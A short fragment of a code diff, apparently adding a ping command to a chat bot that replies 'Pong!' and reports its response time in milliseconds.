+    const sent = await ctx.plain('🏓 Pinging…');
+    const ms = Date.now() - t0;
+    const text = ctx.frame(`🏓 ${bold('Pong!')}\n⚡ Speed: ${ms} ms`);
+    await ctx.send({ text, edit: sent.key }).catch(() => ctx.plain(text));
+  });
+};
